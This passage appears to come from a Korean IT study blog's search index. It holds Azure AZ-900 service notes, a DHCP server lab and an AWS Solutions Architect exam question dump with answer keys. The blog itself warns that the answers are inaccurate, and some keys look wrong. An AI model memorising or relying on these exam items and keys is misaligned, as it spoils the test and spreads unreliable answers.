ㅏ이미 암호화되어 있어, 검색 중에 이를 해독합니다.\n       스토리지 가용성 복제   복제 유형은 스토리지 계정을 만들 때 설정됩니다.\n  복제 기능은 데이터가 내구성이 있으며 항상 사용할 수 있는 지 확인합니다.\n         Azure Cosmos DB (NoSQL)    Azure Cosmos DB는 글로벌 분산형 데이터베이스 서비스로, 지속적으로 변경되는 데이터를 지원하기 위해 응답성이 뛰어난 Always On 애플리케이션을 빌드할 수 있는 스키마 없는 데이터 (NoSQL)을 지원합니다.     Azure SQL Database     Azure SQL Database는 안정적으로 Microsoft SQL Server 데이터베이스 엔진으로 관계형 DaaS (Databases as a Service)입니다.\n  완전 관리형 데이터베이스로, 인프라를 관리할 필요 없이 선택한 프로그래밍 언어와 옵티마이저를 통해 최적의 빌드가 가능합니다.\n  기존 local 환경의 데이터베이스와 마이그레이션이 가능하며 이 때 Microsoft Data Migration Assistant를 사용합니다.\n  자동 크기 조정과 필수 인텔리전스, 강력한 보안을 통해 완벽하게 ### 관리되는 관계형 데이터베이스입니다.\n     Azure Blob Storage     Azure Blob Storage는 비정형 데이터베이스로 포함될 수 있는 데이터의 종류에 제한이 없습니다.\n  수천 개의 동시 업로드, 대용량 비디오 데이터, 끊임없이 증가하는 로그 파일을 관리할 수 있으며, 어디서나 인터넷을 통해 연결할 수 있습니다.\n  일반적으로 파일 형식으로 제한되지 않으며, 최대 8TB의 가상 머신용 데이터를 저장할 수 있습니다.\n     Azure Data Lake Storage    Azure Data Lake Storage는 개체 스토리지의 확정성 및 비용 혜택이 빅 데이터 파일 시스템 기능의 안정성 및 성능과 결합되어 있습니다.     Azure Files     Azure Files는 산업 표준 SMB 프로토콜을 통해 엑세스할 수 있는, 클라우드에서 완전 관리형 파일 공유를 제공합니다.\n  Azure File 공유는 Windows, Linux 및 macOS의 클라우드 또는 온-프레미스 배포를 통해 동시에 탑재될 수 있으며 공유 또한 가능합니다.\n     Azure Queue Storage     Azure Queue Storage는 전 세계 어디에서나 엑세스할 수 있는 많은 수의 메시지를 저장하기 위한 서비스입니다.\n  유연한 애플리케이션을 구축하고 기능을 분리하여 대용량 워크로드 전반에서 내구성을 향상 시킬 수 있습니다.\n  비동기식 메시지 대기열 기능을 제공합니다.\n  기본적으로 하나 이상의 송신기 구성 요소와 하나 이상의 수신기 구성 요소가 존재합니다\n     Queue Storage를 사용하여 하단의 작업들의 수행이 가능합니다.   작업의 백로그를 만들고 다른 Azure 웹 서버 간에 메시지를 전달합니다.\n  여러 웹 서버/ 인프라 간에 로드를 배포하고 트래픽 증가를 관리합니다.\n  여러 사용자가 동싱에 데이터에 엑세스할 때 구성 요소 오류에 대한 복원력을 빌드합니다.\n       Disk Storage     Disk Storage는 가상 머신, 애플리케이션 및 기타 서비스가 온-프레미스 시나리오와 마찬가지로 필요에 따라 엑세스하여 사용할 수 있는 디스크를 제공합니다.\n  Disk Storage는 데이터를 연결된 가상 하드 디스크에서 영구적으로 저장 및 엑세스가 가능하며, 디스크는 Azure 혹은 사용자가 직접 관리가 가능합니다.\n  Disk Storage의 종류에는 SSD, HDD 등 종류가 다양합니다.\n     Azure Synapse Analytics   추가 비용 없이 모든 수준에서 필수 보안을 제공하며 완벽하게 관리되는 데이터 웨어하우스입니다.     Azure Database Migration Service   애플리케이션 코드변경 없이 클라우드로 데이터베이스를 마이그레이션합니다.     Azure Cache for Redis   자주 사용하는 정적 데이터를 캐시하여 데이터 및 애플리케이션 대기 ### 시간을 줄입니다.    "}),a.add({id:170,href:'/docs/azure/microsoftazure/azure03/',title:"Azure Storage",content:"Azure Storage     Azure Storage는 기본적인 스토리지 서비스를 제공하며 다음과 같은 특성을 가지고 있습니다..\n 중복 및 복제 기능을 갖추고 있어 내구성과 가용성이 뛰어납니다.  자동 암호화와 역할 기반 액세스 제어를 통해 보안을 유지합니다.\n 사실상 스토리지에 제한이 없으므로 확장성이 뛰어납니다. 유지 관리 및 사용자에 대한 중요한 문제를 관리하고 처리합니다. HTTP 또는 HTTPS를 통해 전 세계 어디에서든 액세스할 수 있습니다.       Azure Blob Storage   비디오 파일이나 비트맵 같은 대규모 개체를 위한 스토리지 서비스     Azure File   스토리지	파일 서버처럼 액세스하고 관리할 수 있는 파일 공유     Azure Queue   스토리지	애플리케이션 간 메시지를 큐에 넣고 안정적으로 전달하기 위한 데이터 저장소     Azure Table   스토리지	스키마와 관계없이 비정형 데이터를 호스팅하는 NoSQL 스토리지    "}),a.add({id:171,href:'/docs/azure/azuretraining/azure12/',title:"Az-900 : 서비스",content:"Az-900 : 서비스    서비스는 Link를 참조하세요.   IOT 솔루션 (Internet of Things)   Azure IoT Central  보다 손 쉬운 IOT 서비스 구축을 위한 SaaS 형태의 관리형 서비스, (디바이스 연결, 모니터 그리고 관리 및 확장 지원)       Azure IoT Hub  클라우드 기반의 IOT 관리 플랫폼 서비스 (중앙 메시지 허브, 양방향 통신 및 관리)       빅 데이터 분석 솔루션 (Big data and analytics)   Azure Sysnapse Analytics  클라우드 기반의 수십 페타의 데이터를 MPP기반으로 빠르게 처리할 수 있는 온 디맨드 분석을 지원하여 인사이트를 찾아낼 수 있는 솔루션       Azure HDInsight  오픈소스 기반의 Hadoop을 관리되는 형태의 서비스를 제공, 쉽고 빠르고 비용 효율적으로 데이터 처리가 가능       인공지능 (Artificial Intelligence   Azure Machin Learning service  SDK 기반으로 손쉽게 code를 작성하고 train, test, deploy, manage 및 track 할 수 있는 플랫폼을 제공       Azure Machine Learning Studio  GUI 기반으로 코드 없이도 손쉽게 ML model을 만들고 테스트를 배퐇라 수 있는 플랫폼을 제공       서버리스 (Serveless computing)   Azure Functions  서비스를 위한 코드에 집중 (인프라 및 플랫폼으로 부터의 자유도 확보)       Azure Logic Apps  작업 및 비즈니스 프로세스를 자동화하고 오케스트레이션 할 수 있도록 서비스 제공 엔터프라이즈 환경에서 앱, 데이터 긜고 시스템의 통합을 지원       Azure Event Grid  배포와 구독형태의 이벤트 소비를 위한 관리형 엔진 기반의 이벤트 라우팅 서비스       DevOps   Azure DevOps services  클라우드 기반의 통합 개발 협업 서비스 (CI/CD) 제공 파이프라인, Git 저장소, 오픈 소스 연계 등       Azure DevTest Labs  쉽고 빠르게 재사용 가능한 템플릿을 통해 배포하여 최신 개발 코드를 배포 및 테스트 가능       Azure 관리 도구   Azure Advisor  배포된 Azure 리소스를 분석하고 가용성, 보안, 성능, 비용측면을 개선하는 방법을 제공       Azure quick start templates  사전에 code로 설정이 되어 있는 탬플릿을 토대로 리소스를 배포할 수 있게 도와주는 도구 JSON 형태를 가지고 있다.       PowerShell  Window 사용자를 위한 Shell로 Azure 서비스를 관리할 수 있다.       Azure CLI  BASH Shell을 사용하여 Azure 서비스를 관리할 수 있다.       네트워크 연결 보호   심층보호 (Denfense in depth)   컴퓨터 시스템의 안전한 보호를 위한 대한 단계적 접근 방식을 구현\n  여러 수준의 보호를 제공\n  한 레이어에 대한 공격은 후속 레이어에서 격리\n       공동 책임 (Shared security)   고객이 제저아흔 데이터센터에서 클라우드 기반 데이터 센터로 마이그레이션하면 보안에 대한 책임 변경이 발생\n  보안은 클라우드 공급자와 고객 간의 공통 관심사가 됨\n       방화벽 (Azure Firewall)   네트워크 리소스를 보호하기 위해 IP주소를 기반으로 서버 엑세스를 허용/ 거부하도록 하는 PaaS 형태의 방화벽 서비스\n  인 바운드 및 아웃바운드 트래픽 필터링 규칙 적용\n  고 가용성이 내장\n  아웃바운드에서만 애플리케이션 레이어서의 프로텍션을 제공\n  무제한 클라우드 확정성\n  Azure 모니터 로깅을 사용\n       Azure Distributed Denial of Service (DDoS)   DDoS는 지속적인 공격으로 피해자의 리소스를 소모시켜 마비시키는 공격\n  서비스 가용성에 영향을 미치기전에 원치 않는 네트워크 트래픽을 제공\n  베이직은 기본적으로 제공\n  스탠다드는 보다 나은 완화기능 (머신러닝 기반의 어댑티브 튜닝 등)\n       네트워크 보안 그룹 (Network Security Groups : NSGs)   Azure 가상 네트워크에서 Azure 리소스로의 네트어크 트래픽을 필터링\n  소스 및 대상 IPㅈ소, 포트 및 프로토콜로 필터링하도록 인 바운드 및 아웃바운드 규칙의 설정이 가능\n  필요에 따라 구독 한도 내에서 여러 규칙을 추가가능\n  Azure는 세 NSG에 기본적인 기준, 보안 규칙을 적용\n  우선 순위가 높은 규칙으로 기본 규칙 재정의 가능\n       Azure 네트워크 보안 솔루션 선택   경계 레이어 (Perimeter layer)  Azure DDoS 보호 및 Azure 방화벽을 통해 네트워크 경계를 보호       네트워크 레이어 (Networking layer)  NSG(네트워크 보안 그룹) 인 바운드 및 아웃바운드 규칙을 사용하여 네트워크 리소스 간에 허용된 트래픽만 하용       핵심 Azure Identity 서비스   인증 및 권한 (Azure Active Deirctory : AAD)   Microsoft Azure의 클라우드 기반 신원 확인 및 접근 관리 서비스\n  단일인증 (SSO)\n  응용 프로그램 관리\n  B2B (Federation)\n  B2C (Consumer) ID 서비스\n  디바이스 관리\n  인증 (Authentication)\n 리소스에 대한 엑세스를 원하는 사람 또는 서비스를 식별    권한부야 (Authoizotion)\n 리소스에 대한 사용권한을 원하는 사람 또는 서비스에게 제공         다단계인증 (Azure Multi-Factor Authentication)  전체 인증을 위해 두 개 이상의 요소를 요구하여 신원 확인에 대한 추가 보안을 제공 보통 세가지 범류로 분류  당신이 알고 있는 것 당신이 가지고 있는 것 당신 임을 증명할 수 있는 것         보안 도구   보안센터 (Azure Security Center)   Azure 온-프레미스 서비스에 대한 위협 보호 기능을 제공하는 모니터링 서비스\n  구성된 설정, 리소스 및 네트워크에 따라 보안 권장사항을 제공\n       보안 센터 시용 시나리오   장애 시, 감지, 평가 및 진단 단계에서 보안 세터를 사용\n  감지, 평가, 진단만 모니터링 나머지는 자기자신이 해결\n       키 자격증명 (Azure Key Vault)  응용 프로그램 보안을 중앙 집중식 클라우드에 저장하여 액세스 권한을 안전하게 제어 (접근 등에 대한 로깅 및 관리)  비밀번호 관리 키 관리 인증서 관리 하드웨어 보안 모듈 (HSM)을 지원하는 장비에 저장된 비밀번호 정보 가져오기 지원         정보보호 (Azure Information Protecton : AIP)   레이블을 적용하여 문서 및 전자 메일을 분류하고 보호\n  관리자가 정의한 규칙 및 조건을 자동으로 사용 가능\n  사용자가 수동으로 적용, 활용지원\n  권장 사항에 따라 자동 및 수동 방법을 결합할 수 있음\n       고급위협보호 (Azure Advanced Threat Protection : ATP)   지능형 위협, 손상된 ID 및 악의적인 내부자 작업을 식별, 탐지 및 조사하기 위한 클라우드 기반 보안 솔루션\n  Portal : 의심스러운 활동을 모니터링하고 대응하기 위한 전용 포털\n  Sensorts : 도메인 컨트롤러에 직접 설치\n  Cloud Service : Azure 인프라에서 실행\n       Azure 커버넌스 방법론   정책 (Azure Policy)   Azure 리소스에 대한 규칙을 적용하기 위해 정책을 사용하여 회사 표준 및 서비스 수준 계약(SLA)을 준수할 수 있음\n  정책을 준수하지 않는 Azure 리소스를 평가하고 식별\n  스토리지, 네트워킹, 컴퓨팅, 보안 센터 및 모니터링과 같은 범주에서 기본 제공 정책 및 이니셔티브 정의를 제공\n  정챍 정의 \u0026ndash;\u0026gt; 리소스 정책 할당 \u0026ndash;\u0026gt; 평가 검토\n       정책 이니셔티브 (Policy Initiatives)  이니셔티브는 Azure 정책과 함께 작동       역할 기반 액세스 제어 (RBAC)   Azure 리소스에 대한 세분화된 엑세스 관리 제어 기능\n  팀 내에 책임을 분리하여 그 작업을 수행하는 데 필요한 사용자에게만 적당한 권한을 부여\n  Azure 포털 및 리스스의 접근을 허용 및 거부하도록 설정 지원\n   잠금 (Resource locks)   실수로 삭제하거나 수정하지 않도록 Azure 리소스를 보호\n  Azure Portal 에서 구독, 리소스 구룹 또는 개별 리소스 수준에서 잠금을 관리 (상속 지원)\n       Azure Blueprints   Azure 리소스 및 정책들을 즉시 재생성 할 수 있도록 재사용 가능한 환경 정의를 만들 수 있다\n  기본 제공 도구 및 아티팩트를 사용하여 배포를 감사하고 추적하고 규정 준수를 유지\n  Blueprint를 특정 Azure DevOps 빌드 아디펙트 및 릴리스 파이프라인과 연결하여 엄격한 추적을 수행\n       모니터링 및 리포트   태그 (Tags)   Azure 리소스에 대한 메타 데이타 지원\n  {키-값} 쌍으로 구성\n  논리적으로 리소스를 분류하기 위해 활용\n  청구 혹은 관리용 데이터 분석에 용이\n       모니터 (Azure Monitor)  클라우드 및 온-프레미스 환경에서 원격 데이터를 수집, 분석 및 사용하여 애플리케이션의 가용성과 성능을 극대화       서비스건강 (Azure Service Health)     규정 준수 약관 및 요구사항   Microsoft는 다른 클라우드 서비스 공급자보다 가장 포괄적인 compliance offerings (인증 및 증명)을 제공     Azure 가격 책정 및 지원  Azure 구매 및 관리 https://azure.microsoft.com/ko-kr/support/plans/ https://azure.microsoft.com/ko-kr/resources/knowledge-center\n"}),a.add({id:172,href:'/docs/azure/microsoftazure/azure04/',title:"Azure Web",content:"Azure Web    Azure Web 에는 웹앱 및 HTTP 기반 웹 서비스의 빌드 및 호스트에 대한 최고 수준의 지원이 포함되어 있습니다.     Azure App Service   강력한 클라우드 웹 기반 앱을 신속하게 만들기     Azure Notification Hubs   원하는 백 엔드에서 원하는 플랫폼으로 푸시 알림을 전송할 수 있습니다.  Azure API Management   개발자, 파트너 및 직원에게 API를 안전하게 대규모로 게시할 수 있습니다.     Azure Cognitive Search    완전 관리형 SaaS(Search-as-a-Service)입니다.\n  Azure App Service의 Web Apps 기능	중요 업무용 웹앱을 대규모로 만들고 배포할 수 있습니다.\n     Azure SignalR Service   실시간 웹 기능을 쉽게 추가할 수 있습니다.    "}),a.add({id:173,href:'/docs/system/window/window14/',title:"DHCP Server",content:"DHCP Server   DHCP Server의 정의    DHCP란 Dynamic Host Configuration Protocol 서버가 하는 역할은 자신의 네트워크 안에 있는 클라이언트 컴퓨터가 부팅될 떄 자동으로 IP, Subnet, Gateway, DNS를 할당해 주는 역할을 수행합니다.\n  DHCP의 가장 큰 장점은 관리하기 편하고 이용자가 편하다는 장점을 가지고 있습니다.\n     DHCP Server 실습   DHCP 서버 설치를 위해 FIRST 서버에서 서비스 매니저 \u0026gt; 역할 및 기능 추가 \u0026gt; DHCP 서버를 설치합니다.       설치가 완료되면 도구 \u0026gt; DHCP를 실행합니다.       하단의 그림과 같이 새 범위를 선택합니다.       DHCP 범위의 이름을 생성하고 DHCP 범위, 게이트웨이 등의 필요에 맞춰 설정을 진행합니다.         설정이 완료되면 하단의 그림과 같이 생성되었음을 확인하실 수 있습니다.      이제 DHCP 서버를 확인해보기 위해 먼저 Vmware의 Network 설정에서 NAT의 DHCP 할당 설정을 제거합니다.        Vmware의 DHCP 설정이 완료되면 SECOND 서버의 네트워크 인터페이스 \u0026gt; IPv4의 설정에서 자동으로 할당받도록 설정합니다.\n  설정을 마친 후, 재부팅을 진행합니다.\n       cmd르 실행시켜ipconfig /all을 입력하면 하단의 그림과 같이 DHCP 및 범위에 따라 IP가 할당되었음을 확인하실 수 있습니다.     "}),a.add({id:174,href:'/docs/docker/docker/docker/',title:"Docker docs",content:"Docker    Docker docs   Docker란?\n  Docker 환경 구축\n  Docker 이미지와 컨테이너\n  Docker 기본 명령어\n  Dockerfile\n  Docker Compose\n  Docker Swarm\n       Docker Training   작성 중\n  작성 중\n    "}),a.add({id:175,href:'/docs/aws/awssaa/saa-15/',title:"15장 기출문제 정리",content:"15장 기출문제 정리   답들은 정확하지 않습니다. 공부하시면서 찾아보셔야 합니다.   QUESTION 1-100   QUESTION A company has a web application with sporadic usage patterns. There is heavy usage at the beginning of each month, moderate usage at the start of each week, and unpredictable usage during the week. The application consists of a web server and a MySQL database server running inside the data center. The company would like to move the application to the AWS Cloud, and needs to select a cost-effective database platform that will not require database modifications. Which solution will meet these requirements?\nA. Amazon DynamoDB\nB. Amazon RDS for MySQL C. MySQL-compatible Amazon Aurora Serverless D. MySQL deployed on Amazon EC2 in an Auto Scaling group\n\r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A start-up company has a web application based in the us-east-1 Region with multiple Amazon EC2 instances running behind an Application Load Balancer across multiple Availability Zones. As the company\u0026rsquo;s user base grows in the us-west-1 Region, it needs a solution with low latency and high availability. What should a solutions architect do to accomplish this?\nA. Provision EC2 instances in us-west-1. Switch the Application Load Balancer to a Network Load Balancer to achieve cross-Region load balancing. B. Provision EC2 instances and an Application Load Balancer in us-west-1. Make the load balancer distribute the traffic based on the location of the request. C. Provision EC2 instances and configure an Application Load Balancer in us-west-1. Create an accelerator in AWS Global Accelerator that uses an endpoint group that includes the load balancer endpoints in both Regions. D. Provision EC2 instances and configure an Application Load Balancer in us-west-1. Configure Amazon Route 53 with a weighted routing policy. Create alias records in Route 53 that point to the Application Load Balancer. \r문제 풀이\r...\r\rAnswer: C Explanation https://aws.amazon.com/global-accelerator/faqs/ Register endpoints for endpoint groups: You register one or more regional resources, such as Application Load Balancers, Network Load Balancers, EC2 Instances, or Elastic IP addresses, in each endpoint group. Then you can set weights to choose how much traffic is routed to each endpoint. Endpoints in AWS Global Accelerator Endpoints in AWS Global Accelerator can be Network Load Balancers, Application Load Balancers, Amazon EC2 instances, or Elastic IP addresses. A static IP address serves as a single point of contact for clients, and Global Accelerator then distributes incoming traffic across healthy endpoints. Global Accelerator directs traffic to endpoints by using the port (or port range) that you specify for the listener that the endpoint group for the endpoint belongs to. Each endpoint group can have multiple endpoints. You can add each endpoint to multiple endpoint groups, but the endpoint groups must be associated with different listeners. Global Accelerator continually monitors the health of all endpoints that are included in an endpoint group. It routes traffic only to the active endpoints that are healthy. If Global Accelerator doesn\u0026rsquo;t have any healthy endpoints to route traffic to, it routes traffic to all endpoints. https://docs.aws.amazon.com/global-accelerator/latest/dg/about-endpoints.html\r\r\r\r   QUESTION A solutions architect is designing an application for a two-step order process The first step is synchronous and must return to the user with little latency The second step takes longer, so it will be implemented in a separate component Orders must be processed exactly once and in the order in which they are received How should the solutions architect integrate these components?\nA. Use an Amazon SQS FIFO queues B. Use an AWS Lambda function along with Amazon SQS standard queues C. Create an SNS topic and subscribe an Amazon SQS FIFO queue to that topic D. Create an SNS topic and subscribe an Amazon SQS Standard queue to that topic. \r문제 풀이\r...\r\rAnswer: A C가 불가능한 이유는 SQS FIFO와 SNS는 함께 사용이 불가능합니다.\r\r\r\r   QUESTION A leasing company generates and emails PDF statements every month for all its customers. Each statement is about 400 KB in size. Customers can download their statements from the website for up to 30 days from when the statements were generated. At the end of their 3-year lease, thecustomers are emailed a ZIP file that contains all the statements. What is the MOST cost-effective storage solution for this situation?\nA. Store the statements using the Amazon S3 Standard storage class. Create a lifecycle policy tomove the statements to Amazon S3 Glacier storage after 1 day. B. Store the statements using the Amazon S3 Glacier storage class. Create a lifecycle policy to movethe statements to Amazon S3 Glacier Deep Archive storage after 30 days. C. Store the statements using the Amazon S3 Standard storage class. Create a lifecycle policy to move the statements to Amazon S3 One Zone-Infrequent Access (S3 One Zone-IA) storage after 30 days. D. Store the statements using the Amazon S3 Standard-Infrequent Access (S3 Standard-IA) storage class. Create a lifecycle policy to move the statements to Amazon S3 Glacier storage after 30 days. \r문제 풀이\r...\r\rAnswer: D S3-IA는 파일 크기 당 최소 128kb, 최소 30일의 저장기간을 가지고 있습니다. Deep 아카이브는 가장 저렴하지만 속도가 느리고 3년 후의 파일이 검색되므로 불가능합니다.\r\r\r\r   QUESTION A company is designing a message-driven order processing application on AWS. The application consists of many services and needs to communicate the results of its processing to multiple consuming services. Each of the consuming services may take up to 5 days to receive the messages Which process will meet these requirements?\nA. The application sends the results of its processing to an Amazon Simple Notification Service (Amazon SNS) topic Each consuming service subscribes to this SNS topic and consumes the results B. The application sends the results of its processing to an Amazon Simple Notification Service (Amazon SNS) topic Each consuming service consumes the messages directly from its corresponding SNS topic. C. The application sends the results of its processing to an Amazon Simple Queue Service (Amazon SQS) queue Each consuming service runs as an AWS Lambda function that consumes this single SQS queue. D. The application sends the results of its processing to an Amazon Simple Notification Service (Amazon SNS) topic. An Amazon Simple Queue Service (Amazon SQS) queue is created for each service and each queue is configured to be a subscriber of the SNS topic. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company delivers files in Amazon S3 to certain users who do not have AWS credentials. These users must be given access for a limited lime. What should a solutions architect do to securely meet these requirements?\nA. Enable public access on an Amazon S3 bucket. B. Generate a presigned URL to share with the users. C. Encrypt files using AWS KMS and provide keys to the users. D. Create and assign IAM roles that will grant GetObject permissions to the users. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has an application that runs on Amazon EC2 instances within a private subnet in a VPC The instances access data in an Amazon S3 bucket in the same AWS Region. The VPC contains a NAT gateway in a public subnet to access the S3 bucket The company wants to reduce costs by replacing the NAT gateway without compromising security or redundancy Which solution meets these requirements?\nA. Replace the NAT gateway with a NAT instance B. Replace the NAT gateway with an internet gateway. C. Replace the NAT gateway with a gateway VPC endpoint D. Replace the NAT gateway with an AWS Direct Connect connection \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a two-tier application architecture that runs in public and private subnets Amazon EC2 instances running the web application are in the public subnet and a database runs on the private subnet The web application instances and the database are running in a single Availability Zone (AZ). Which combination of steps should a solutions architect take to provide high availability for this architecture? (Select TWO.)\nA. Create new public and private subnets in the same AZ for high availability B. Create an Amazon EC2 Auto Scaling group and Application Load Balancer spanning multiple AZs C. Add the existing web application instances to an Auto Scaling group behind an Application Load Balancer D. Create new public and private subnets in a new AZ Create a database using Amazon EC2 in one AZ E. Create new public and private subnets in the same VPC each in a new AZ Migrate the database to an Amazon RDS multi-AZ deployment \r문제 풀이\r...\r\rAnswer: B E Explanation You can take advantage of the safety and reliability of geographic redundancy by spanning your Auto Scaling group across multiple Availability Zones within a Region and then attaching a load balancer to distribute incoming traffic across those zones. Incoming traffic is distributed equally across all Availability Zones enabled for your load balancer. Note An Auto Scaling group can contain Amazon EC2 instances from multiple Availability Zones within the\n81 same Region. However, an Auto Scaling group can\u0026rsquo;t contain instances from multiple Regions. When one Availability Zone becomes unhealthy or unavailable, Amazon EC2 Auto Scaling launches new instances in an unaffected zone. When the unhealthy Availability Zone returns to a healthy state, Amazon EC2 Auto Scaling automatically redistributes the application instances evenly across all of the zones for your Auto Scaling group. Amazon EC2 Auto Scaling does this by attempting to launch new instances in the Availability Zone with the fewest instances. If the attempt fails, however, Amazon EC2 Auto Scaling attempts to launch in other Availability Zones until it succeeds. You can expand the availability of your scaled and load-balanced application by adding an Availability Zone to your Auto Scaling group and then enabling that zone for your load balancer. After you\u0026rsquo;ve enabled the new Availability Zone, the load balancer begins to route traffic equally among all the enabled zones. High Availability (Multi-AZ) for Amazon RDS Amazon RDS provides high availability and failover support for DB instances using Multi-AZ deployments. Amazon RDS uses several different technologies to provide failover support. Multi-AZ deployments for MariaDB, MySQL, Oracle, and PostgreSQL DB instances use Amazon\u0026rsquo;s failover technology. SQL Server DB instances use SQL Server Database Mirroring (DBM) or Always On Availability Groups (AGs). In a Multi-AZ deployment, Amazon RDS automatically provisions and maintains a synchronous standby replica in a different Availability Zone. The primary DB instance is synchronously replicated across Availability Zones to a standby replica to provide data redundancy, eliminate I/O freezes, and minimize latency spikes during system backups. Running a DB instance with high availability can enhance availability during planned system maintenance, and help protect your databases against DB instance failure and Availability Zone disruption. For more information on Availability Zones, see Regions, Availability Zones, and Local Zones https://docs.aws.amazon.com/autoscaling/ec2/userguide/as-add-availability-zone.html https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.MultiAZ.html\n\r\r\r   QUESTION A company is developing a new machine learning model solution in AWS. The models are developed as independent microservices that fetch about 1 GB of model data from Amazon S3 at startup and load the data into memory. Users access the models through an asynchronous API. Users can send a request or a batch of requests and specify where the results should be sent. The company provides models to hundreds of users. The usage patterns for the models are irregular Some models could be unused for days or weeks Other models could receive batches of thousands of requests at a time Which solution meets these requirements?\nA. The requests from the API are sent to an Application Load Balancer (ALB) Models are deployed as AWS Lambda functions invoked by the ALB. B. The requests from the API are sent to the models Amazon Simple Queue Service (Amazon SQS) queue.\nModels are deployed as AWS Lambda functions triggered by SQS events AWS Auto Scaling is enabled on Lambda to increase the number of vCPUs based on the SQS queue size C. The requests from the API are sent to the model\u0026rsquo;s Amazon Simple Queue Service (Amazon SQS) queue. Models are deployed as Amazon Elastic Container Service (Amazon ECS) services reading from the queue AWS App Mesh scales the instances of the ECS cluster based on the SQS queue size. D. The requests from the API are sent to the models Amazon Simple Queue Service (Amazon SQS) queueModels are deployed as Amazon Elastic Container Service (Amazon ECS) services reading from the queue AWS Auto Scaling .s enabled on Amazon ECS for both the cluster and copies of the service based on the queue size. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has several business systems that require access to data stored in a file share.\nthe business systems will access the file share using the Server Message Block (SMB) protocol. The file share solution should be accessible from both of the company\u0026rsquo;s legacy on-premises environment and with AWS. Which services mod the business requirements? (Select TWO.)\nA. Amazon EBS B. Amazon EFS C. Amazon FSx for Windows D. Amazon S3 E. AWS Storage Gateway file gateway \r문제 풀이\r...\r\rAnswer: C E   Amazon FSx 파일 스토리지는 Windows, Linux 및 MacOS 컴퓨팅 인스턴스 및 AWS 또는 온 프레미스에서 실행되는 디바이스에서 액세스 할 수 있습니다.\n  AWS Storage Gateway는 사실상 무제한 클라우드 스토리지에 대한 온 프레미스 액세스를 제공하는 하이브리드 클라우드 스토리지 서비스입니다. Storage Gateway는 기존 애플리케이션을 다시 작성하지 않고도 AWS 스토리지를 사용할 수 있도록 iSCSI, SMB 및 NFS와 같은 표준 스토리지 프로토콜 세트를 제공합니다.\n  \r\r\r   QUESTION A company recently deployed a two-tier application in two Availability Zones in the us-east1 Region. The databases are deployed in a private subnet while the web servers are deployed in a public subnet. An internet gateway is attached to the VPC. The application and database run on Amazon EC2 instances. The database servers are unable to access patches on the internet. A solutions architect needs to design a solution that maintains database security with the least operational overhead.\nWhich solution meets these requirements?\nA. Deploy a NAT gateway inside the public subnet for each Availability Zone and associate it with an Elastic IP address. Update the routing table of the private subnet to use it as the default route. B. Deploy a NAT gateway inside the private subnet for each Availability Zone and associate it with an Elastic IP address. Update the routing table of the private subnet to use it as the default route. C. Deploy two NAT instances inside the public subnet for each Availability Zone and associate them with Elastic IP addresses. Update the routing table of the private subnet to use it as the default route. D. Deploy two NAT instances inside the private subnet for each Availability Zone and associate them with Elastic IP addresses. Update the routing table of the private subnet to use it as the default route. \r문제 풀이\r...\r\rAnswer: A NAT 인스턴스는 퍼블릭 서브넷에 이치해야합니다.\r\r\r\r   QUESTION A solutions architect observes that a nightly batch processing job is automatically scaled up for 1 hour before the desired Amazon EC2 capacity is reached. The peak capacity is the same every night and the batch jobs always start at 1 AM. The solutions architect needs to find a cost-effective solution that will allow for the desired EC2 capacity to be reached quickly and allow the Auto Scaling group to scale down after the batch jobs are complete. What should the solutions architect do to meet these requirements?\nA. Increase the minimum capacity for the Auto Scaling group.\nB. Increase the maximum capacity for the Auto Scaling group.\nC. Configure scheduled scaling to scale up to the desired compute level.\nD. Change the scaling policy to add more EC2 instances during each scaling operation. \r문제 풀이\r...\r\rAnswer: C 정기적인 배치 작업이 필요하다면, 예약 구매를 통해 비용을 줄일 수 있습니다.\r\r\r\r   QUESTION A solutions architect is implementing a document review application using an Amazon S3 bucket for storage The solution must prevent accidental deletion of the documents and ensure that all versions of the documents are available Users must be able to download, modify, and upload documents Which combination of actions should be taken to meet these requirements? (Select TWO)\nA. Enable a read-only bucket ACL B. Enable versioning on the bucket C. Attach an IAM policy to the bucket D. Enable MFA Delete on the bucket E. Encrypt the bucket using AWS KMS \r문제 풀이\r...\r\rAnswer: B D Explanation Object Versioning Use Amazon S3 Versioning to keep multiple versions of an object in one bucket. For example, you could store my-image.jpg (version 111111) and my-image.jpg (version 222222) in a single bucket. S3 Versioning protects you from the consequences of unintended overwrites and deletions. You can also use it to archive objects so that you have access to previous versions. To customize your data retention approach and control storage costs, use object versioning with Object lifecycle management. For information about creating S3 Lifecycle policies using the AWS Management Console, see How Do I Create a Lifecycle Policy for an S3 Bucket?\nin the Amazon Simple Storage Service Console User Guide. If you have an object expiration lifecycle policy in your non-versioned bucket and you want to maintain the same permanent delete behavior when you enable versioning, you must add a noncurrent expiration policy. The noncurrent expiration lifecycle policy will manage the deletes of the noncurrent object versions\nin the version-enabled bucket. (A version-enabled bucket maintains one current and zero or more noncurrent object versions.) You must explicitly enable S3 Versioning on your bucket. By default, S3 Versioning is disabled. Regardless of whether you have enabled Versioning, each object in your bucket has a version ID. If you have not enabled Versioning, Amazon S3 sets the value of the version ID to null. If S3 Versioning is enabled, Amazon S3 assigns a version ID value for the object. This value distinguishes it from other versions of the same key. Enabling and suspending versioning is done at the bucket level. When you enable versioning on an existing bucket, objects that are already stored in the bucket are unchanged. The version IDs (null), contents, and permissions remain the same. After you enable S3 Versioning for a bucket, each object that is added to the bucket gets a version ID, which distinguishes it from other versions of the same key. Only Amazon S3 generates version IDs, and they can\u0026rsquo;t be edited. Version IDs are Unicode, UTF-8 encoded, URL-ready, opaque strings that are no more than 1,024 bytes long. The following is an example: 3/L4kqtJlcpXroDTDmJ+rmSpXd3dIbrHY+MTRCxf3vjVBH40Nr8X8gdRQBpUMLUo. Using MFA delete If a bucket\u0026rsquo;s versioning configuration is MFA Delete-enabled, the bucket owner must include the xamz-mfa request header in requests to permanently delete an object version or change the versioning state of the bucket. Requests that include x-amz-mfa must use HTTPS. The header\u0026rsquo;s value is the concatenation of your authentication device\u0026rsquo;s serial number, a space, and the authentication code displayed on it. If you do not include this request header, the request fails. https://docs.aws.amazon.com/AmazonS3/latest/dev/ObjectVersioning.html https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingMFADelete.html\n\r\r\r   QUESTION A company wants to migrate a high performance computing (HPC) application and 